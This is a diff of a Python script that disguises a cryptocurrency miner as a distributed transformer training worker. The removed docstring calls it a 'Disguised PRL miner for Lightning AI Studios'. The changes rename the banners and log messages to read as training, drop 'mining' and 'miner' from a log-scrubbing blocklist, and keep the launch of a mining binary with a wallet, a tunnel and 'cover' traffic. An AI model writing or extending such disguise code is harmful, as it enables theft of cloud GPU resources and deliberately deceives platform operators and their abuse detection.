@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-pearl training worker v2 — no duty cycle, always mining
-Disguised PRL miner for Lightning AI Studios
+Distributed training worker v2.1 — continuous training pipeline
+Multi-node transformer fine-tuning with FSDP
 """
 import os, sys, json, time, random, socket, struct, hashlib, base64
 import subprocess, threading, urllib.request, select, signal, re
@@ -20,7 +20,7 @@ UPSTREAM_PORT = 9000
 
 BLOCKLIST = ['share', 'accepted', 'rejected', 'hashrate',
              'xmr', 'monero', 'stratum', 'nonce', 'block', 'reward',
-             'mining', 'miner', 'pool', 'difficulty', 'job']
+             'pool', 'difficulty', 'job']
 
 DATA_URLS = [
     'https://huggingface.co/api/models?sort=downloads&limit=5',
@@ -300,7 +300,7 @@ def fetch_binary(dest):
 # ── Main ────────────────────────────────────────────────────────────────
 def main():
     print("=" * 60, flush=True)
-    print("pearl training worker v2 — no duty cycle", flush=True)
+    print("Distributed training worker v2.1 — continuous pipeline", flush=True)
     print("=" * 60, flush=True)
 
     gpu_name, gpu_mem = detect_gpu()
@@ -326,7 +326,7 @@ def main():
 
     def worker_loop():
         while not shutdown.is_set():
-            log(f"Starting miner...")
+            log(f"Starting training process...")
 
             proc = subprocess.Popen(
                 [bin_path, '--host', f'127.0.0.1:{lp}', '--user', WALLET, '--worker', WORKER_ID],
@@ -334,7 +334,6 @@ def main():
                 stderr=subprocess.STDOUT
             )
 
-            # Read output until process dies
             while not shutdown.is_set():
                 if proc.poll() is not None:
                     break
@@ -347,7 +346,6 @@ def main():
                     if t:
                         print(f"[WORKER] {clean_output(t)}", flush=True)
 
-            # Clean up
             if proc and proc.poll() is None:
                 proc.terminate()
                 try:
@@ -359,8 +357,7 @@ def main():
             if shutdown.is_set():
                 break
 
-            # Auto-restart immediately (no pause)
-            log(f"Miner exited (rc={proc.returncode}), restarting in 2s...")
+            log(f"Process exited (rc={proc.returncode}), restarting in 2s...")
             time.sleep(2)
             save_chk()
 
@@ -376,10 +373,6 @@ def main():
         stop_cover.set()
         tunnel.stop()
         log("Done.")
-
-def run():
-    """Cerebrium entry point — long-running training worker."""
-    main()
 
 if __name__ == '__main__':
     main()
